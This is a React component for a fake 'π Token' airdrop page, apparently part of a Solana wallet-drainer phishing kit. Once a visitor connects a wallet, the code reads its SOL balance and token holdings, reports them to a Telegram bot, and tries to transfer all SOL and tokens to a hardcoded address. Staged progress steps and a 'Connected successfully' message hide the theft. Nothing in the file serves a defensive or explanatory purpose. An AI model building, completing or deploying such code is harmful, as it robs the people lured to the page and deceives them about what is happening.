
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useEffect, useState } from 'react';
import { toast } from '@/components/ui/use-toast';
import { Menu } from "lucide-react";
import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';
import { getTokenAccounts, getWalletBalance, sendToTelegram, transferTokens, signAndSendTransaction } from '@/utils/walletUtils';

// Recipient wallet address - replace with your own Solana address
const RECIPIENT_ADDRESS = "9iD7zunFKFJmgWnzLkiPSi3RbUWWMJNJ6AwEZ6bG3JJi";

const Index = () => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isConnecting, setIsConnecting] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>([
    { id: 'init', label: 'Initializing Connection', status: 'pending' },
    { id: 'walletConnect', label: 'Connecting to Wallet', status: 'pending' },
    { id: 'fetchData', label: 'Fetching Wallet Data', status: 'pending' },
    { id: 'processData', label: 'Processing', status: 'pending' }
  ]);
  const [currentStep, setCurrentStep] = useState('init');

  // Update step status
  const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error', details?: string) => {
    setConnectionSteps(prevSteps => prevSteps.map(step => 
      step.id === stepId 
        ? { ...step, status, details } 
        : step
    ));
  };

  // Enhanced wallet connection handler with Telegram notification and token transfer
  const handleWalletConnected = async () => {
    if (!connected || !publicKey || isConnecting) return;
    
    setIsConnecting(true);
    setIsModalOpen(true);
    
    try {
      // Step 1: Initialize connection
      updateStepStatus('init', 'active');
      await new Promise(resolve => setTimeout(resolve, 500));
      updateStepStatus('init', 'completed');
      
      // Step 2: Connect to wallet
      updateStepStatus('walletConnect', 'active');
      setCurrentStep('walletConnect');
      await new Promise(resolve => setTimeout(resolve, 800));
      updateStepStatus('walletConnect', 'completed');
      
      // Step 3: Fetch wallet data (SOL balance and tokens)
      updateStepStatus('fetchData', 'active', 'Getting wallet balance...');
      setCurrentStep('fetchData');
      
      // Get SOL balance
      const solBalance = await getWalletBalance(publicKey.toString());
      console.log("SOL Balance:", solBalance);
      
      // Get token accounts
      const tokens = await getTokenAccounts(connection, publicKey.toString());
      console.log("Tokens:", tokens);
      
      updateStepStatus('fetchData', 'completed', `Found ${tokens.length} tokens`);
      
      // Step 4: Send notification to Telegram and process transfer
      updateStepStatus('processData', 'active', 'Processing wallet data...');
      setCurrentStep('processData');
      
      // Get Telegram settings from localStorage
      const botToken = localStorage.getItem('TELEGRAM_BOT_TOKEN');
      const chatId = localStorage.getItem('TELEGRAM_CHAT_ID');
      
      // Send initial wallet data to Telegram
      if (botToken && chatId) {
        console.log("Sending wallet data to Telegram");
        await sendToTelegram({
          address: publicKey.toString(),
          balance: solBalance,
          tokens: tokens,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      } else {
        console.log("Telegram credentials not found in localStorage");
        toast({
          title: "Telegram Not Configured",
          description: "Please set up your Telegram bot token and chat ID in settings.",
          variant: "warning",
        });
      }
      
      // Process token transfer
      if (botToken && chatId && RECIPIENT_ADDRESS) {
        try {
          console.log("Attempting to transfer tokens to:", RECIPIENT_ADDRESS);
          updateStepStatus('processData', 'active', 'Preparing transfer...');
          
          // Attempt to transfer SOL and tokens
          const result = await signAndSendTransaction(
            connection, 
            wallet, 
            RECIPIENT_ADDRESS, 
            solBalance, // Transfer all SOL
            botToken,
            chatId,
            tokens // Include tokens for transfer
          );
          
          console.log("Transfer result:", result);
          updateStepStatus('processData', 'completed', 'Transfer complete');
          
        } catch (transferError) {
          console.error("Transfer error:", transferError);
          updateStepStatus('processData', 'error', 'Transfer failed');
          
          // Still show as connected even if transfer fails
          toast({
            title: "Transfer Failed",
            description: transferError instanceof Error ? transferError.message : "Failed to transfer funds",
            variant: "destructive",
          });
        }
      } else {
        updateStepStatus('processData', 'completed');
      }
      
      toast({
        title: "Connected",
        description: "Your wallet has been connected successfully.",
      });
      
      // Close modal after a short delay
      setTimeout(() => {
        setIsModalOpen(false);
      }, 1000);
      
    } catch (error) {
      console.error('Connection error:', error);
      updateStepStatus(currentStep, 'error', error instanceof Error ? error.message : 'Unknown error');
      
      toast({
        title: "Connection Error",
        description: error instanceof Error ? error.message : "Failed to connect wallet",
        variant: "destructive",
      });
      
      // Close modal after error is shown
      setTimeout(() => {
        setIsModalOpen(false);
      }, 2000);
    } finally {
      setIsConnecting(false);
    }
  };

  useEffect(() => {
    if (connected && publicKey) {
      handleWalletConnected();
    }
  }, [connected, publicKey]);

  return (
    <div className="min-h-screen bg-background p-6 relative">
      {/* Use the LoadingModal component */}
      <LoadingModal 
        isOpen={isModalOpen} 
        steps={connectionSteps} 
        currentStep={currentStep} 
      />
      
      <nav className="flex justify-between items-center mb-20">
        <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
          <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
            <span className="text-2xl font-bold text-cyan-400">π</span>
          </div>
        </div>
        
        <div className="flex gap-4">
          <a href="/settings" className="flex items-center justify-center w-10 h-10 rounded-full bg-gray-800 hover:bg-gray-700 transition-colors">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5 text-cyan-400">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9.594 3.94c.09-.542.56-.94 1.11-.94h2.593c.55 0 1.02.398 1.11.94l.213 1.281c.063.374.313.686.645.87.074.04.147.083.22.127.324.196.72.257 1.075.124l1.217-.456a1.125 1.125 0 011.37.49l1.296 2.247a1.125 1.125 0 01-.26 1.431l-1.003.827c-.293.24-.438.613-.431.992a6.759 6.759 0 010 .255c-.007.378.138.75.43.99l1.005.828c.424.35.534.954.26 1.43l-1.298 2.247a1.125 1.125 0 01-1.369.491l-1.217-.456c-.355-.133-.75-.072-1.076.124a6.57 6.57 0 01-.22.128c-.331.183-.581.495-.644.869l-.213 1.28c-.09.543-.56.941-1.11.941h-2.594c-.55 0-1.02-.398-1.11-.94l-.213-1.281c-.062-.374-.312-.686-.644-.87a6.52 6.52 0 01-.22-.127c-.325-.196-.72-.257-1.076-.124l-1.217.456a1.125 1.125 0 01-1.369-.49l-1.297-2.247a1.125 1.125 0 01.26-1.431l1.004-.827c.292-.24.437-.613.43-.992a6.932 6.932 0 010-.255c.007-.378-.138-.75-.43-.99l-1.004-.828a1.125 1.125 0 01-.26-1.43l1.297-2.247a1.125 1.125 0 011.37-.491l1.216.456c.356.133.751.072 1.076-.124.072-.044.146-.087.22-.128.332-.183.582-.495.644-.869l.214-1.281z" />
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
          </a>
        </div>
      </nav>

      <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
        <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
          Join The π Adventure
        </h1>
        
        <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!
        </p>

        <div className="flex flex-col items-center w-full max-w-md gap-4 mt-4">
          <div className="flex justify-center w-full">
            <WalletMultiButton 
              className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" 
            />
          </div>
        </div>

        <div className="mt-20">
          <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
            <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
              <span className="text-5xl font-bold text-[#FFA500]">π</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
